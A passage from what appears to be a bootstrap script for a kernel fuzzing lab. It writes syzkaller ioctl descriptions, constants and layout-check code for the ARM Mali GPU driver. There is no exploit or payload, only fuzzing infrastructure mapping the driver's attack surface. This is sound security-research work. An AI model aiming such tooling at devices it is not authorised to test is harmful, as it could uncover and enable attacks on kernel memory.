	flags		flags[base_mem_alloc_flags, int64]
}

kbase_ioctl_mem_query {
	gpu_addr	gpu_addr
	query		flags[kbase_ioctl_mem_query_flags, int64]
}

kbase_ioctl_mem_free {
	gpu_addr	gpu_addr
}

kbase_ioctl_hwcnt_reader_setup {
	buffer_count	int32
	fe_bm			int32
	shader_bm		int32
	tiler_bm		int32
	mmu_l2_bm		int32
}

kbase_ioctl_hwcnt_values {
	data	ptr64[out, array[int8]]
	size	len[data, int32]
	padding	const[0, int32]
}

kbase_ioctl_disjoint_query {
	counter	int32
}

kbase_ioctl_get_ddk_version {
	version_buffer	ptr64[out, array[int8]]
	size			len[version_buffer, int32]
	padding			const[0, int32]
}

kbase_ioctl_mem_jit_init {
	va_pages		int64
	max_allocations	int8
	trim_level		int8
	group_id		int8
	padding			array[const[0, int8], 5]
	phys_pages		int64
}

# r36p0: struct kbase_ioctl_mem_jit_init_10_2 { __u64 va_pages } — 8B.
kbase_ioctl_mem_jit_init_10_2 {
	va_pages	int64
}

# r36p0: struct kbase_ioctl_mem_jit_init_11_5 — 16B (va_pages + 3 u8 + u8[5]).
kbase_ioctl_mem_jit_init_11_5 {
	va_pages		int64
	max_allocations	int8
	trim_level		int8
	group_id		int8
	padding			array[const[0, int8], 5]
}

kbase_ioctl_mem_exec_init {
	va_pages	int64
}

kbase_ioctl_mem_sync {
	handle		gpu_addr
	user_addr	user_addr
	size		int64
	type		flags[base_syncset_op_flags, int8]
	padding		array[const[0, int8], 7]
}

kbase_ioctl_mem_find_cpu_offset {
	gpu_addr	gpu_addr
	cpu_addr	user_addr
	size		int64
}

kbase_ioctl_mem_find_gpu_start_and_offset {
# union (16B): in {gpu_addr, size}; out {start@0, offset@8}. @0 doubles as
# out.start (a live region base) -> inout gpu_addr for chaining.
	gpu_addr	gpu_addr	(inout)
	size		int64		(inout)
}

kbase_ioctl_get_context_id {
	id	int32
}

kbase_ioctl_tlstream_acquire {
	flags	int32
}

kbase_ioctl_mem_commit {
	gpu_addr	gpu_addr
	pages		int64
}

kbase_ioctl_mem_alias {
# union (32B): in {flags, stride, nents, aliasing_info};
# out {flags@0, gpu_va@8, va_pages@16}. @8 doubles as out.gpu_va.
	flags		flags[base_mem_alloc_flags, int64]
	gpu_va		gpu_addr	(inout)
	nents		len[aliasing_info, int64]
	aliasing_info	ptr64[in, array[base_mem_aliasing_info]]
}

base_mem_aliasing_info {
	handle	gpu_addr
	offset	int64
	length	int64
}

kbase_ioctl_mem_import {
# union (24B): in {flags, phandle, type, padding};
# out {flags@0, gpu_va@8, va_pages@16}. @8 doubles as out.gpu_va.
	flags		flags[base_mem_alloc_flags, int64]
	phandle		gpu_addr	(inout)
	type		flags[base_mem_import_type, int32]
	padding		const[0, int32]
}

kbase_ioctl_mem_flags_change {
	gpu_va	gpu_addr
	flags	flags[base_mem_alloc_flags, int64]
	mask	int64
}

kbase_ioctl_stream_create {
	name	array[int8, 32]
}

kbase_ioctl_fence_validate {
	fd	fd_fence
}

kbase_ioctl_mem_profile_add {
	buffer	ptr64[in, array[int8]]
	len		len[buffer, int32]
	padding	const[0, int32]
}

kbase_ioctl_sticky_resource_map {
	count	len[address, int64]
	address	ptr64[in, array[gpu_addr]]
}

kbase_ioctl_sticky_resource_unmap {
	count	len[address, int64]
	address	ptr64[in, array[gpu_addr]]
}

kbase_ioctl_get_cpu_gpu_timeinfo {
	request_flags	flags[base_timerequest_allowed_flags, int32]
	paddings		array[const[0, int8], 28]
}

kbase_ioctl_kinstr_prfcnt_enum_info {
	info_item_size	int32
	info_item_count	int32
	info_list_ptr	ptr64[out, array[int8]]
}

kbase_ioctl_kinstr_prfcnt_setup {
	request_item_count	int32
	request_item_size	int32
	requests_ptr		ptr64[in, array[int8]]
}

kbase_ioctl_context_priority_check {
	priority	int8
}

kbase_ioctl_set_limited_core_count {
	max_core_count	int8
}

# r41p0 has TWO generations of the buffer ioctls on the SAME nr (0x20/0x21),
# distinguished by _IOC_SIZE: legacy (16B, offsetof-cycles) and *_WITH_CYCLES
# (32B full metadata). Model both, release-exact.
kbase_hwcnt_reader_metadata_legacy {
	timestamp	int64
	event_id	int32
	buffer_idx	int32
}

kbase_hwcnt_reader_api_version {
	version	int32
	features int32
}

kbase_hwcnt_reader_metadata_cycles {
	top			int64
	shader_cores	int64
}

kbase_hwcnt_reader_metadata {
	timestamp	int64
	event_id	int32
	buffer_idx	int32
	cycles		kbase_hwcnt_reader_metadata_cycles
}

kbase_ioctl_mem_query_flags = KBASE_MEM_QUERY_COMMIT_SIZE, KBASE_MEM_QUERY_VA_SIZE, KBASE_MEM_QUERY_FLAGS
base_syncset_op_flags = BASE_SYNCSET_OP_MSYNC, BASE_SYNCSET_OP_CSYNC
# 0x400000-0x2000000 are individual bits of BASE_MEM_GROUP_ID_MASK
# (r41p0 has no BASE_MEM_TILER_ALIGN_TOP_EXTENT_MAX_PAGES — ChromeOS-bifrost only)
# CSF ABI renames JM's bit 8/19/20: RESERVED_BIT_8 -> BASE_MEM_FIXED,
# RESERVED_BIT_19 -> BASE_MEM_CSF_EVENT, TILER_ALIGN_TOP -> RESERVED_BIT_20;
# JM-only BASE_MEM_FLAG_MAP_FIXED (bit 27) has no CSF define -> dropped.
base_mem_alloc_flags = BASE_MEM_PROT_CPU_RD, BASE_MEM_PROT_CPU_WR, BASE_MEM_PROT_GPU_RD, BASE_MEM_PROT_GPU_WR, BASE_MEM_PROT_GPU_EX, BASEP_MEM_PERMANENT_KERNEL_MAPPING, BASE_MEM_GPU_VA_SAME_4GB_PAGE, BASEP_MEM_NO_USER_FREE, BASE_MEM_FIXED, BASE_MEM_GROW_ON_GPF, BASE_MEM_COHERENT_SYSTEM, BASE_MEM_COHERENT_LOCAL, BASE_MEM_CACHED_CPU, BASE_MEM_SAME_VA, BASE_MEM_NEED_MMAP, BASE_MEM_COHERENT_SYSTEM_REQUIRED, BASE_MEM_PROTECTED, BASE_MEM_DONT_NEED, BASE_MEM_IMPORT_SHARED, BASE_MEM_CSF_EVENT, BASE_MEM_RESERVED_BIT_20, BASE_MEM_UNCACHED_GPU, 0x400000, 0x800000, 0x1000000, 0x2000000, BASE_MEM_IMPORT_SYNC_ON_MAP_UNMAP
base_mem_import_type = BASE_MEM_IMPORT_TYPE_INVALID, BASE_MEM_IMPORT_TYPE_UMM, BASE_MEM_IMPORT_TYPE_USER_BUFFER
# 0x08-0x20 are individual bits of BASEP_CONTEXT_MMU_GROUP_ID_MASK
basep_context_create_kernel_flags = BASE_CONTEXT_SYSTEM_MONITOR_SUBMIT_DISABLED, 0x8, 0x10, 0x20, 0x40
base_timerequest_allowed_flags = BASE_TIMEINFO_MONOTONIC_FLAG, BASE_TIMEINFO_TIMESTAMP_FLAG, BASE_TIMEINFO_CYCLE_COUNTER_FLAG, BASE_TIMEINFO_KERNEL_SOURCE_FLAG, BASE_TIMEINFO_USER_SOURCE_FLAG

# ---- CSF-mode struct models (sizes = sizeof from release headers, 2026-10
# gcc cross-check; layout_check_r36p0.c re-asserts them at gate time).

kbase_ioctl_mem_alloc_ex {
# C union (64B): in {va_pages, commit_pages@8, extension, flags,
# fixed_address, extra[3]}; out {flags@0, gpu_va@8}. @8 modeled as the out
# view (gpu_va) — same chaining pattern as kbase_ioctl_mem_alloc.
	va_pages	int64
	gpu_va		gpu_addr	(inout)
	extension	int64
	flags		flags[base_mem_alloc_flags, int64]
	fixed_address	int64
	extra		array[int64, 3]
}

kbase_ioctl_cs_queue_register {
# 16B. buffer_gpu_addr chains with MEM_ALLOC gpu_va.
	buffer_gpu_addr	gpu_addr
	buffer_size	int32
	priority	int8
	padding		array[const[0, int8], 3]
}

kbase_ioctl_cs_queue_kick {
# 8B.
	buffer_gpu_addr	gpu_addr
}

kbase_ioctl_cs_queue_bind {
# C union (16B): in {buffer_gpu_addr, group_handle, csi_index, padding[6]};
# out {mmap_handle@0} aliases buffer_gpu_addr — ignored (a handle, not an
# address; NOT chained to avoid corrupting gpu_addr).
	buffer_gpu_addr	gpu_addr
	group_handle	int8
	csi_index	int8
	padding		array[const[0, int8], 6]
}

kbase_ioctl_cs_queue_register_ex {
# 40B: queue_register prefix + trace-buffer extension.
	buffer_gpu_addr	gpu_addr
	buffer_size	int32
	priority	int8
	padding		array[const[0, int8], 3]
	ex_offset_var_addr	int64
	ex_buffer_base	int64
	ex_buffer_size	int32
	ex_event_size	int8
	ex_event_state	int8
	ex_padding	array[const[0, int8], 2]
}

kbase_ioctl_cs_queue_terminate {
# 8B.
	buffer_gpu_addr	gpu_addr
}

kbase_ioctl_cs_queue_group_create_1_6 {
# C union (32B): in {...}; out {group_handle, pad[3], group_uid} overlaps the
# first 8 bytes — ignored (u8 handle cannot carry the int64 gpu resource
# layout; queue_bind/group_term consume it as a plain int8).
	tiler_mask	int64
	fragment_mask	int64
	compute_mask	int64
	cs_min		int8
	priority	int8
	tiler_max	int8
	fragment_max	int8
	compute_max	int8
	padding		array[const[0, int8], 3]
}

kbase_ioctl_cs_queue_group_create {
# C union (40B): group_create_1_6 prefix + u64 reserved.
	tiler_mask	int64
	fragment_mask	int64
	compute_mask	int64
	cs_min		int8
	priority	int8
	tiler_max	int8
	fragment_max	int8
	compute_max	int8
	padding		array[const[0, int8], 3]
	reserved	int64
}

kbase_ioctl_cs_queue_group_term {
# 8B.
	group_handle	int8
	padding		array[const[0, int8], 7]
}

kbase_ioctl_kcpu_queue_new {
# 8B, _IOR (id returned by kernel).
	id		int8
	padding		array[const[0, int8], 7]
}

kbase_ioctl_kcpu_queue_delete {
# 8B.
	id		int8
	padding		array[const[0, int8], 7]
}

kbase_ioctl_kcpu_queue_enqueue {
# 16B. nr_commands is const[1]: r36p0 rejects any other count outright.
	addr		ptr64[in, base_kcpu_command]
	nr_commands	const[1, int32]
	id		int8
	padding		array[const[0, int8], 3]
}

base_kcpu_command {
# 24B (uapi csf/mali_base_csf_kernel.h): type + 7B pad + 16B info union
# {fence, cqs_wait/set(_operation), import, jit_alloc/free, group_suspend}.
# The union is opaque bytes; the fuzzed `type` selects the handler, which
# then validates its typed view (fds checked via fdget, addrs via maps).
	type		int8
	padding		array[const[0, int8], 7]
	info		array[const[0, int8], 16]
}

kbase_ioctl_cs_tiler_heap_init {
# C union (16B): in {chunk_size, initial_chunks, max_chunks,
# target_in_flight, group_id, padding}; out {gpu_heap_va, first_chunk_va} —
# no CSF ioctl consumes those VAs, so the in-view is modeled.
	chunk_size	int32
	initial_chunks	int32
	max_chunks	int32
	target_in_flight	int16
	group_id	int8
	padding		int8
}

kbase_ioctl_cs_tiler_heap_term {
# 8B.
	gpu_heap_va	int64
}

kbase_ioctl_cs_get_glb_iface {
# C union (24B): in {max_group_num, max_total_stream_num, groups_ptr,
# streams_ptr}; out {6×u32} aliases — the driver writes through the user
# pointers (copy_to_user), which syzlang models as ptr64[out].
	max_group_num	int32
	max_total_stream_num	int32
	groups_ptr	ptr64[out, array[int8]]
	streams_ptr	ptr64[out, array[int8]]
}

kbase_ioctl_cs_cpu_queue_info {
# 16B: kernel dumps size bytes of CPU-queue state to buffer.
	buffer	ptr64[out, array[int8]]
	size	int64
}
__PL_18__
  sha256_pin "$LAB_ROOT/fuzzing/syzkaller/refs/dev_mali_r36p0_csf.txt" "a449d771f1946122abd3a300df919c0e27ab87b48ae6ae4ca79db9922f656f51"

  mkdir -p "$(dirname "$LAB_ROOT/fuzzing/syzkaller/refs/dev_mali_r36p0_csf.txt.const")"
  cat > "$LAB_ROOT/fuzzing/syzkaller/refs/dev_mali_r36p0_csf.txt.const" <<'__PL_19__'
# Code generated by syz-sysgen. DO NOT EDIT.
arches = amd64, arm64
AT_FDCWD = 18446744073709551516
BASEP_MEM_INVALID_HANDLE = 0
BASEP_MEM_NO_USER_FREE = 128
BASEP_MEM_PERMANENT_KERNEL_MAPPING = 32
BASEP_MEM_WRITE_ALLOC_PAGES_HANDLE = 16384
BASE_CONTEXT_SYSTEM_MONITOR_SUBMIT_DISABLED = 2
BASE_MEM_CACHED_CPU = 4096
BASE_MEM_COHERENT_LOCAL = 2048
BASE_MEM_COHERENT_SYSTEM = 1024
BASE_MEM_COHERENT_SYSTEM_REQUIRED = 32768
BASE_MEM_CSF_EVENT = 524288
BASE_MEM_DONT_NEED = 131072
BASE_MEM_FIXED = 256
BASE_MEM_GPU_VA_SAME_4GB_PAGE = 64
BASE_MEM_GROW_ON_GPF = 512
BASE_MEM_IMPORT_SHARED = 262144
BASE_MEM_IMPORT_SYNC_ON_MAP_UNMAP = 67108864
BASE_MEM_IMPORT_TYPE_INVALID = 0
BASE_MEM_IMPORT_TYPE_UMM = 2
BASE_MEM_IMPORT_TYPE_USER_BUFFER = 3
BASE_MEM_NEED_MMAP = 16384
BASE_MEM_PROTECTED = 65536
BASE_MEM_PROT_CPU_RD = 1
BASE_MEM_PROT_CPU_WR = 2
BASE_MEM_PROT_GPU_EX = 16
BASE_MEM_PROT_GPU_RD = 4
BASE_MEM_PROT_GPU_WR = 8
BASE_MEM_RESERVED_BIT_20 = 1048576
BASE_MEM_SAME_VA = 8192
BASE_MEM_UNCACHED_GPU = 2097152
BASE_SYNCSET_OP_CSYNC = 2
BASE_SYNCSET_OP_MSYNC = 1
BASE_TIMEINFO_CYCLE_COUNTER_FLAG = 4
BASE_TIMEINFO_KERNEL_SOURCE_FLAG = 1073741824
BASE_TIMEINFO_MONOTONIC_FLAG = 1
BASE_TIMEINFO_TIMESTAMP_FLAG = 2
BASE_TIMEINFO_USER_SOURCE_FLAG = 2147483648
KBASE_HWCNT_READER_CLEAR = 1074052625
KBASE_HWCNT_READER_DISABLE_EVENT = 1074052673
KBASE_HWCNT_READER_DUMP = 1074052624
KBASE_HWCNT_READER_ENABLE_EVENT = 1074052672
KBASE_HWCNT_READER_GET_API_VERSION = 1074052863
KBASE_HWCNT_READER_GET_API_VERSION_WITH_FEATURES = 1074315007
KBASE_HWCNT_READER_GET_BUFFER = 2148580896
KBASE_HWCNT_READER_GET_BUFFER_SIZE = 2147794433
KBASE_HWCNT_READER_GET_BUFFER_WITH_CYCLES = 2149629472
KBASE_HWCNT_READER_GET_HWVER = 2147794432
KBASE_HWCNT_READER_PUT_BUFFER = 1074839073
KBASE_HWCNT_READER_PUT_BUFFER_WITH_CYCLES = 1075887649
KBASE_HWCNT_READER_SET_INTERVAL = 1074052656
KBASE_IOCTL_CONTEXT_PRIORITY_CHECK = 3221323830
KBASE_IOCTL_CS_CPU_QUEUE_DUMP = 1074823221
KBASE_IOCTL_CS_EVENT_SIGNAL = 32812
KBASE_IOCTL_CS_GET_GLB_IFACE = 3222831155
KBASE_IOCTL_CS_QUEUE_BIND = 3222306855
KBASE_IOCTL_CS_QUEUE_GROUP_CREATE = 3223879738
KBASE_IOCTL_CS_QUEUE_GROUP_CREATE_1_6 = 3223355434
KBASE_IOCTL_CS_QUEUE_GROUP_TERMINATE = 1074298923
KBASE_IOCTL_CS_QUEUE_KICK = 1074298917
KBASE_IOCTL_CS_QUEUE_REGISTER = 1074823204
KBASE_IOCTL_CS_QUEUE_REGISTER_EX = 1076396072
KBASE_IOCTL_CS_QUEUE_TERMINATE = 1074298921
KBASE_IOCTL_CS_TILER_HEAP_INIT = 3222306864
KBASE_IOCTL_CS_TILER_HEAP_TERM = 1074298929
KBASE_IOCTL_DISJOINT_QUERY = 2147778572
KBASE_IOCTL_FENCE_VALIDATE = 1074036761
KBASE_IOCTL_GET_CONTEXT_ID = 2147778577
KBASE_IOCTL_GET_CPU_GPU_TIMEINFO = 3223355442
KBASE_IOCTL_GET_DDK_VERSION = 1074823181
KBASE_IOCTL_GET_GPUPROPS = 1074823171
KBASE_IOCTL_HWCNT_READER_SETUP = 1075085320
KBASE_IOCTL_HWCNT_SET = 1074823200
KBASE_IOCTL_KCPU_QUEUE_CREATE = 2148040749
KBASE_IOCTL_KCPU_QUEUE_DELETE = 1074298926
KBASE_IOCTL_KCPU_QUEUE_ENQUEUE = 1074823215
KBASE_IOCTL_KINSTR_PRFCNT_ENUM_INFO = 3222306872
KBASE_IOCTL_KINSTR_PRFCNT_SETUP = 3222306873
KBASE_IOCTL_MEM_ALIAS = 3223355413
KBASE_IOCTL_MEM_ALLOC = 3223355397
KBASE_IOCTL_MEM_ALLOC_EX = 3225452603
KBASE_IOCTL_MEM_COMMIT = 1074823188
KBASE_IOCTL_MEM_EXEC_INIT = 1074298918
KBASE_IOCTL_MEM_FIND_CPU_OFFSET = 3222831120
KBASE_IOCTL_MEM_FIND_GPU_START_AND_OFFSET = 3222306847
KBASE_IOCTL_MEM_FLAGS_CHANGE = 1075347479
KBASE_IOCTL_MEM_FREE = 1074298887
KBASE_IOCTL_MEM_IMPORT = 3222831126
KBASE_IOCTL_MEM_JIT_INIT = 1075347470
KBASE_IOCTL_MEM_JIT_INIT_10_2 = 1074298894
KBASE_IOCTL_MEM_JIT_INIT_11_5 = 1074823182
KBASE_IOCTL_MEM_PROFILE_ADD = 1074823195
KBASE_IOCTL_MEM_QUERY = 3222306822
KBASE_IOCTL_MEM_SYNC = 1075871759
KBASE_IOCTL_SET_FLAGS = 1074036737
KBASE_IOCTL_SET_LIMITED_CORE_COUNT = 1073840183
KBASE_IOCTL_STICKY_RESOURCE_MAP = 1074823197
KBASE_IOCTL_STICKY_RESOURCE_UNMAP = 1074823198
KBASE_IOCTL_STREAM_CREATE = 1075871768
KBASE_IOCTL_TLSTREAM_ACQUIRE = 1074036754
KBASE_IOCTL_TLSTREAM_FLUSH = 32787
KBASE_IOCTL_VERSION_CHECK = 3221520436
KBASE_IOCTL_VERSION_CHECK_RESERVED = 3221520384
KBASE_MEM_QUERY_COMMIT_SIZE = 1
KBASE_MEM_QUERY_FLAGS = 3
KBASE_MEM_QUERY_VA_SIZE = 2
__NR_ioctl = amd64:16, arm64:29
__NR_mmap = amd64:9, arm64:222
__NR_munmap = amd64:11, arm64:215
__NR_openat = amd64:257, arm64:56
__PL_19__
  sha256_pin "$LAB_ROOT/fuzzing/syzkaller/refs/dev_mali_r36p0_csf.txt.const" "04c70d66201260cfe6a0150e3a0ffd18b8b71f6bdfd9f62df1b64f7eb1e88996"

  mkdir -p "$(dirname "$LAB_ROOT/fuzzing/syzkaller/shim_mali_base_kernel.h.in")"
  cat > "$LAB_ROOT/fuzzing/syzkaller/shim_mali_base_kernel.h.in" <<'__PL_20__'
/* syz-extract shim for the inline-era (pre-uapi-split) r28p0 headers:
 * they use kernel typedefs (u64/u8/u16), require CDBG_ASSERT/KBASE_DEBUG_ASSERT,
 * and take an unavailable <osu/mali_osu.h> branch unless PAGE_SHIFT/PAGE_MASK
 * are predefined. Pure extraction scaffolding - includes the REAL header by
 * absolute path after the compat block.
 *
 * @LAB@ is substituted by bootstrap_mali_lab.sh with the lab root at
 * extraction time (extract_consts r28p0). */
#ifndef MALI_R28P0_EXTRACT_SHIM_H
#define MALI_R28P0_EXTRACT_SHIM_H
#include <linux/types.h>
typedef __u64 u64;
typedef __u32 u32;
typedef __u16 u16;
typedef __u8  u8;
#define CDBG_ASSERT(x) ((void)0)
#ifndef PAGE_SHIFT
#define PAGE_SHIFT 12
#endif
#ifndef PAGE_MASK
#define PAGE_MASK (~(u64)((1UL << PAGE_SHIFT) - 1))
#endif
#include "@LAB@/harness/release_uapi/r28p0/gpu/arm/midgard/mali_base_kernel.h"
#endif
__PL_20__
  sha256_pin "$LAB_ROOT/fuzzing/syzkaller/shim_mali_base_kernel.h.in" "8d76bd7e01a013b38789386357b714f9543de2b455f4a1fb257599c267bfc742"

  mkdir -p "$(dirname "$LAB_ROOT/harness/release_uapi/mode-csf/mali_use_csf.h")"
  cat > "$LAB_ROOT/harness/release_uapi/mode-csf/mali_use_csf.h" <<'__PL_21__'
/* syz-extract mode header for MALI_MODE=csf descriptions: must be the
 * FIRST include of dev_mali_r36p0_csf.txt so mali_kbase_ioctl.h takes the
 * CSF branch (same -DMALI_USE_CSF=1 the driver Kbuild sets). */
#ifndef MALI_USE_CSF
#define MALI_USE_CSF 1
#endif
__PL_21__
  sha256_pin "$LAB_ROOT/harness/release_uapi/mode-csf/mali_use_csf.h" "d918a1a02e9c6282094c54173b2305307786a08f4c307a5d0cee392ea904242b"

  mkdir -p "$(dirname "$LAB_ROOT/harness/release_uapi/r36p0/layout_check_r36p0.c")"
  cat > "$LAB_ROOT/harness/release_uapi/r36p0/layout_check_r36p0.c" <<'__PL_22__'
/* layout_check_r36p0.c — release-layout gate for the r36p0-01eac0 JM UAPI.
 *
 * Purpose (Phase H): prove that the struct layouts encoded in the lab's
 * release-matched syzkaller description (fuzzing/syzkaller/syzkaller-r41p0/
 * sys/linux/dev_mali_r36p0.txt) match the *actual* r36p0-01eac0 headers
 * copied into this directory, and that every modeled ioctl carries the
 * exact _IOC_SIZE of its release definition. Derived from
 * layout_check_r36p0.c; the r36p0 delta is the surviving JIT-init family
 * (nr 14 × sizes 8/16/24) — everything else is byte-identical between the
 * two releases (asserted, not assumed).
 *
 * Build + run (host any arch; UAPI structs are arch-independent here):
 *   gcc -O2 -static -I <this dir> layout_check_r36p0.c -o layout_check_r36p0
 *   ./layout_check_r36p0          # asserts only (compile-time gate)
 *   ./layout_check_r36p0 --dump   # + sizeof/offset/cmd table for evidence
 *
 * Any layout drift fails the COMPILE (static_assert), never silently.
 * The CSF-mode companion is layout_check_r36p0_csf.c (MALI_MODE=csf).
 */
#include <stdio.h>
#include <stddef.h>
#include <string.h>

/* MALI_USE_CSF must be undefined/0: this kernel is built in JM mode, so
 * mali_kbase_ioctl.h pulls jm/mali_kbase_jm_ioctl.h — the branch the
 * syzkaller description targets. */
#if MALI_USE_CSF
#error "MALI_USE_CSF is set: this checker validates the JM-mode r41p0 UAPI only"
#endif

#include <gpu/arm/midgard/mali_kbase_ioctl.h>
#include <gpu/arm/midgard/mali_base_kernel.h>
#include <gpu/arm/midgard/jm/mali_base_jm_kernel.h>
#include <gpu/arm/midgard/mali_kbase_hwcnt_reader.h>

#define CK_SIZE(T, N) \
	_Static_assert(sizeof(T) == (N), "sizeof(" #T ") != " #N " (description mismatch)")
#define CK_OFF(T, F, N) \
	_Static_assert(offsetof(T, F) == (N), "offsetof(" #T "." #F ") != " #N " (description mismatch)")
#define CK_IOC(cmd, T) \
	_Static_assert(_IOC_SIZE(cmd) == sizeof(T), "_IOC_SIZE(" #cmd ") != sizeof(" #T ")")

/* ---- struct sizes expected by dev_mali_r36p0.txt ---- */
CK_SIZE(struct kbase_ioctl_version_check, 4);
CK_SIZE(struct kbase_ioctl_set_flags, 4);
CK_SIZE(struct kbase_ioctl_get_gpuprops, 16);
CK_SIZE(struct kbase_ioctl_job_submit, 16);
CK_SIZE(struct base_jd_udata, 16);
CK_SIZE(struct base_dependency, 2);
CK_SIZE(struct base_jd_atom_v2, 56);
CK_SIZE(union kbase_ioctl_mem_alloc, 32);
CK_SIZE(union kbase_ioctl_mem_query, 16);
CK_SIZE(struct kbase_ioctl_mem_free, 8);
CK_SIZE(struct kbase_ioctl_hwcnt_reader_setup, 20);
CK_SIZE(struct kbase_ioctl_hwcnt_values, 16);
CK_SIZE(struct kbase_ioctl_disjoint_query, 4);
CK_SIZE(struct kbase_ioctl_get_ddk_version, 16);
CK_SIZE(struct kbase_ioctl_mem_jit_init, 24);
CK_SIZE(struct kbase_ioctl_mem_jit_init_10_2, 8);   /* r36p0: nr14, 8B form */
CK_SIZE(struct kbase_ioctl_mem_jit_init_11_5, 16);  /* r36p0: nr14, 16B form */
CK_SIZE(struct kbase_ioctl_mem_exec_init, 8);
CK_SIZE(struct kbase_ioctl_mem_sync, 32);
CK_SIZE(union kbase_ioctl_mem_find_cpu_offset, 24);
CK_SIZE(union kbase_ioctl_mem_find_gpu_start_and_offset, 16);
CK_SIZE(struct kbase_ioctl_get_context_id, 4);
CK_SIZE(struct kbase_ioctl_tlstream_acquire, 4);
CK_SIZE(struct kbase_ioctl_mem_commit, 16);
CK_SIZE(union kbase_ioctl_mem_alias, 32);
CK_SIZE(struct base_mem_aliasing_info, 24);
CK_SIZE(union kbase_ioctl_mem_import, 24);
CK_SIZE(struct kbase_ioctl_mem_flags_change, 24);
CK_SIZE(struct kbase_ioctl_stream_create, 32);
CK_SIZE(struct kbase_ioctl_fence_validate, 4);
CK_SIZE(struct kbase_ioctl_mem_profile_add, 16);
CK_SIZE(struct kbase_ioctl_sticky_resource_map, 16);
CK_SIZE(struct kbase_ioctl_sticky_resource_unmap, 16);
CK_SIZE(struct kbase_ioctl_soft_event_update, 16);
CK_SIZE(union kbase_ioctl_get_cpu_gpu_timeinfo, 32);
CK_SIZE(struct kbase_kinstr_jm_fd_in, 8);
CK_SIZE(struct kbase_kinstr_jm_fd_out, 8);
CK_SIZE(union kbase_kinstr_jm_fd, 8);
CK_SIZE(struct kbase_ioctl_kinstr_prfcnt_enum_info, 16);
CK_SIZE(union kbase_ioctl_kinstr_prfcnt_setup, 16);
CK_SIZE(struct kbase_ioctl_context_priority_check, 1);
CK_SIZE(struct kbase_ioctl_set_limited_core_count, 1);
CK_SIZE(struct kbase_hwcnt_reader_metadata_cycles, 16);
CK_SIZE(struct kbase_hwcnt_reader_metadata, 32);
CK_SIZE(struct kbase_hwcnt_reader_api_version, 8);
/* size-encoded variants share an nr; the size bits select the generation.
 * The description's kbase_hwcnt_reader_metadata_legacy == the prefix of the
 * real metadata struct up to offsetof(..., cycles). */
#define CK_IOC_OFF(cmd, T, M) \
	_Static_assert(_IOC_SIZE(cmd) == offsetof(T, M), "cmd size != offsetof(" #T "." #M ")")
CK_IOC_OFF(KBASE_HWCNT_READER_GET_BUFFER, struct kbase_hwcnt_reader_metadata, cycles);
CK_IOC(KBASE_HWCNT_READER_GET_BUFFER_WITH_CYCLES, struct kbase_hwcnt_reader_metadata);
CK_IOC_OFF(KBASE_HWCNT_READER_PUT_BUFFER, struct kbase_hwcnt_reader_metadata, cycles);
CK_IOC(KBASE_HWCNT_READER_PUT_BUFFER_WITH_CYCLES, struct kbase_hwcnt_reader_metadata);
CK_IOC(KBASE_HWCNT_READER_GET_API_VERSION, __u32);
CK_IOC(KBASE_HWCNT_READER_GET_API_VERSION_WITH_FEATURES, struct kbase_hwcnt_reader_api_version);

/* ---- key offsets (the union-share slots used for gpu_addr chaining) ---- */
CK_OFF(struct base_jd_atom_v2, jit_id, 34);          /* r36p0: same layout as r41p0 (jit_id[2], not the bifrost compat u16) */
CK_OFF(struct base_jd_atom_v2, pre_dep, 36);
CK_OFF(struct base_jd_atom_v2, core_req, 44);
CK_OFF(union kbase_ioctl_mem_alloc, out.gpu_va, 8);  /* desc models gpu_addr at @8 */
CK_OFF(union kbase_ioctl_mem_alias, out.gpu_va, 8);  /* desc models gpu_addr at @8 (in.stride slot) */
CK_OFF(union kbase_ioctl_mem_import, out.gpu_va, 8); /* desc models gpu_addr at @8 (in.phandle slot) */
CK_OFF(union kbase_ioctl_mem_find_gpu_start_and_offset, out.start, 0);
CK_OFF(union kbase_ioctl_get_cpu_gpu_timeinfo, in.paddings, 4);
CK_OFF(struct kbase_hwcnt_reader_metadata, cycles, 16); /* r41p0-only tail */

/* ---- every cmd's encoded size must equal the modeled struct ---- */
CK_IOC(KBASE_IOCTL_VERSION_CHECK, struct kbase_ioctl_version_check);
CK_IOC(KBASE_IOCTL_VERSION_CHECK_RESERVED, struct kbase_ioctl_version_check);
CK_IOC(KBASE_IOCTL_SET_FLAGS, struct kbase_ioctl_set_flags);
CK_IOC(KBASE_IOCTL_GET_GPUPROPS, struct kbase_ioctl_get_gpuprops);
CK_IOC(KBASE_IOCTL_JOB_SUBMIT, struct kbase_ioctl_job_submit);
CK_IOC(KBASE_IOCTL_MEM_ALLOC, union kbase_ioctl_mem_alloc);
CK_IOC(KBASE_IOCTL_MEM_QUERY, union kbase_ioctl_mem_query);
CK_IOC(KBASE_IOCTL_MEM_FREE, struct kbase_ioctl_mem_free);
CK_IOC(KBASE_IOCTL_HWCNT_READER_SETUP, struct kbase_ioctl_hwcnt_reader_setup);
CK_IOC(KBASE_IOCTL_HWCNT_SET, struct kbase_ioctl_hwcnt_values);
CK_IOC(KBASE_IOCTL_DISJOINT_QUERY, struct kbase_ioctl_disjoint_query);
CK_IOC(KBASE_IOCTL_GET_DDK_VERSION, struct kbase_ioctl_get_ddk_version);
CK_IOC(KBASE_IOCTL_MEM_JIT_INIT, struct kbase_ioctl_mem_jit_init);
CK_IOC(KBASE_IOCTL_MEM_JIT_INIT_10_2, struct kbase_ioctl_mem_jit_init_10_2);
CK_IOC(KBASE_IOCTL_MEM_JIT_INIT_11_5, struct kbase_ioctl_mem_jit_init_11_5);
CK_IOC(KBASE_IOCTL_MEM_EXEC_INIT, struct kbase_ioctl_mem_exec_init);
CK_IOC(KBASE_IOCTL_MEM_SYNC, struct kbase_ioctl_mem_sync);
CK_IOC(KBASE_IOCTL_MEM_FIND_CPU_OFFSET, union kbase_ioctl_mem_find_cpu_offset);
CK_IOC(KBASE_IOCTL_MEM_FIND_GPU_START_AND_OFFSET,
       union kbase_ioctl_mem_find_gpu_start_and_offset);
CK_IOC(KBASE_IOCTL_GET_CONTEXT_ID, struct kbase_ioctl_get_context_id);
CK_IOC(KBASE_IOCTL_TLSTREAM_ACQUIRE, struct kbase_ioctl_tlstream_acquire);
CK_IOC(KBASE_IOCTL_MEM_COMMIT, struct kbase_ioctl_mem_commit);
CK_IOC(KBASE_IOCTL_MEM_ALIAS, union kbase_ioctl_mem_alias);
CK_IOC(KBASE_IOCTL_MEM_IMPORT, union kbase_ioctl_mem_import);
CK_IOC(KBASE_IOCTL_MEM_FLAGS_CHANGE, struct kbase_ioctl_mem_flags_change);
CK_IOC(KBASE_IOCTL_STREAM_CREATE, struct kbase_ioctl_stream_create);
